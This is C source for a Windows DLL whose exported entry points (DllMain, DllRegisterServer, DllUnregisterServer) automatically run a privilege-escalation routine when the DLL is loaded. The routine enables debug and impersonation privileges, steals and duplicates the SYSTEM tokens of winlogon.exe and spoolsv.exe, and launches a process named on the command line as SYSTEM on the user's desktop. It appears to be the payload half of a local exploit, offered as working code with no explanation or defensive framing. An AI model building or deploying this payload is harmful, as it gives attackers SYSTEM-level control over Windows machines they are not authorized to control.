#include <tchar.h>
#include <Windows.h>
#include <Psapi.h>
#include <TlHelp32.h>
#include <strsafe.h>

#define DLLEXPORT __declspec(dllexport)

BOOL bActionDone = FALSE;
DWORD dwActiveConsoleSessionId;

DWORD getSpoolerPID(void)
{
	TCHAR strMsg[1024] = { 0 };
	PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (TRUE == Process32First(snapshot, &entry))
    {
        while (TRUE == Process32Next(snapshot, &entry))
        {
            if (0 == _tcscmp(entry.szExeFile, _T("spoolsv.exe")))
            {
				_stprintf_s(strMsg, _countof(strMsg), _T("Spooler PID found: %d"), entry.th32ProcessID);
				OutputDebugString(strMsg);
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

DWORD getWinlogonPID(void)
{
	TCHAR strMsg[1024] = { 0 };
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (TRUE == Process32First(snapshot, &entry))
	{
		while (TRUE == Process32Next(snapshot, &entry))
		{
			if (0 == _tcscmp(entry.szExeFile, _T("winlogon.exe")))
			{
				_stprintf_s(strMsg, _countof(strMsg), _T("Winlogon PID found: %d"), entry.th32ProcessID);
				OutputDebugString(strMsg);
				CloseHandle(snapshot);
				return entry.th32ProcessID;
			}
		}
	}
	CloseHandle(snapshot);
	return 0;
}


BOOL SetPrivilege(HANDLE hToken, LPCTSTR lpszPrivilege)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;
	BOOL bStatus;

	bStatus = LookupPrivilegeValue(NULL, lpszPrivilege, &luid);
	if (!bStatus)
	{
		_tprintf(_T("ERROR: LookupPrivilegeValue() returned %lu\r\n"), GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	bStatus = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL);
	if (!bStatus)
	{
		_tprintf(_T("ERROR: AdjustTokenPrivileges() returned %lu\r\n"), GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		_tprintf(_T("ERROR: The token does not have the specified privilege.\r\n"));
		return FALSE;
	}
	return TRUE;
}


DWORD elevateAsWinlogon(void)
{
	TCHAR strMsg[1024] = { 0 };
	_stprintf_s(strMsg, _countof(strMsg), _T("Entering %hs"), __FUNCTION__);
	OutputDebugString(strMsg);

	BOOL bStatus;
	DWORD dwLastError;
	HANDLE currentTokenHandle = NULL;
	bStatus = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: OpenProcessToken() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		return GetLastError();
	}

	bStatus = SetPrivilege(currentTokenHandle, SE_DEBUG_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_DEBUG_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(currentTokenHandle);
		return dwLastError;
	}

	bStatus = SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_IMPERSONATE_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(currentTokenHandle);
		return dwLastError;
	}
	CloseHandle(currentTokenHandle);


	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	DWORD pidToImpersonate;

	pidToImpersonate = getWinlogonPID();

	if (0 == pidToImpersonate)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: Useful PID was not found."));
		OutputDebugString(strMsg);
		return ERROR_ERRORS_ENCOUNTERED;
	}

	HANDLE processHandle;
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
	if (NULL == processHandle)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: OpenProcess() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		return GetLastError();
	}

	bStatus = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: OpenProcessToken returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(processHandle);
		return dwLastError;
	}
	CloseHandle(processHandle);

	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;

	bStatus = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: DuplicateTokenEx returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(tokenHandle);
		return dwLastError;
	}
	
	bStatus = SetPrivilege(duplicateTokenHandle, SE_ASSIGNPRIMARYTOKEN_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}

	bStatus = ImpersonateLoggedOnUser(duplicateTokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: ImpersonateLoggedOnUser() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}

	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	_stprintf_s(strMsg, _countof(strMsg), _T("Elevation successful."));
	OutputDebugString(strMsg);
	return ERROR_SUCCESS;
}

DWORD elevateAndRunAsSpooler(LPWSTR lpApplicationName)
{
	TCHAR strMsg[1024] = { 0 };
	_stprintf_s(strMsg, _countof(strMsg), _T("Entering %hs"), __FUNCTION__);
	OutputDebugString(strMsg);
	BOOL bStatus;
	DWORD dwLastError;
	HANDLE currentTokenHandle = NULL;
	bStatus = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &currentTokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: OpenProcessToken() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		return GetLastError();
	}

	bStatus = SetPrivilege(currentTokenHandle, SE_DEBUG_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_DEBUG_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(currentTokenHandle);
		return dwLastError;
	}

	bStatus = SetPrivilege(currentTokenHandle, SE_IMPERSONATE_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_IMPERSONATE_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(currentTokenHandle);
		return dwLastError;
	}
	CloseHandle(currentTokenHandle);

	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	DWORD pidToImpersonate;

	pidToImpersonate = getSpoolerPID();

	if (0 == pidToImpersonate)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: Useful PID was not found."));
		OutputDebugString(strMsg);
		return ERROR_ERRORS_ENCOUNTERED;
	}

	HANDLE processHandle;
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, TRUE, pidToImpersonate);
	if (NULL == processHandle)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: OpenProcess() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		return GetLastError();
	}

	bStatus = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, &tokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: OpenProcessToken returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(processHandle);
		return dwLastError;
	}
	CloseHandle(processHandle);

	SECURITY_IMPERSONATION_LEVEL seimp = SecurityImpersonation;
	TOKEN_TYPE tk = TokenPrimary;

	bStatus = DuplicateTokenEx(tokenHandle, MAXIMUM_ALLOWED, NULL, seimp, tk, &duplicateTokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: DuplicateTokenEx returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(tokenHandle);
		return dwLastError;
	}

	bStatus = SetPrivilege(duplicateTokenHandle, SE_ASSIGNPRIMARYTOKEN_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_ASSIGNPRIMARYTOKEN_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}

	bStatus = SetPrivilege(duplicateTokenHandle, SE_TCB_NAME);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetPrivilege(SE_TCB_NAME) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}

	bStatus = ImpersonateLoggedOnUser(duplicateTokenHandle);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: ImpersonateLoggedOnUser() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}


	DWORD dwSessionId;

	bStatus = ProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: ProcessIdToSessionId() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}

	bStatus = SetTokenInformation(duplicateTokenHandle, TokenSessionId, &dwSessionId, sizeof(dwSessionId));
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: SetTokenInformation(TokenSessionId) returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		dwLastError = GetLastError();
		CloseHandle(duplicateTokenHandle);
		CloseHandle(tokenHandle);
		return dwLastError;
	}


	_stprintf_s(strMsg, _countof(strMsg), _T("Elevation successful. Launching child process."));
	OutputDebugString(strMsg);

	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	si.cb = sizeof(si);
	
	si.lpDesktop = _T("Winsta0\\Default");
	si.wShowWindow = TRUE;
	bStatus = CreateProcessAsUserW(duplicateTokenHandle, lpApplicationName, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
	if (!bStatus)
	{
		_stprintf_s(strMsg, _countof(strMsg), _T("ERROR: CreateProcessAsUser() returned %lu"), GetLastError());
		OutputDebugString(strMsg);
		return (int)GetLastError();
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(duplicateTokenHandle);
	CloseHandle(tokenHandle);
	return ERROR_SUCCESS;
}


DLLEXPORT
VOID doIt(void)
{
    if (!bActionDone)
    {
        bActionDone = TRUE;

		dwActiveConsoleSessionId = WTSGetActiveConsoleSessionId();

        LPWSTR* wszArgList;
        int numArgs;

        wszArgList = CommandLineToArgvW(GetCommandLineW(), &numArgs);
        if (NULL != wszArgList)
        {
			elevateAsWinlogon();
        	elevateAndRunAsSpooler(wszArgList[numArgs - 1]);
            LocalFree(wszArgList);
        }
    }
}

#pragma warning( disable : 4104) // ignore warning about private functions - https://docs.microsoft.com/en-us/cpp/error-messages/tool-errors/linker-tools-warning-lnk4104

DLLEXPORT 
STDAPI
DllRegisterServer(void)
{
    doIt();
	return S_OK;
}


DLLEXPORT
STDAPI
DllUnregisterServer(void)
{
    doIt();
    return S_OK;
}


DLLEXPORT
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    doIt();
    return TRUE;
}

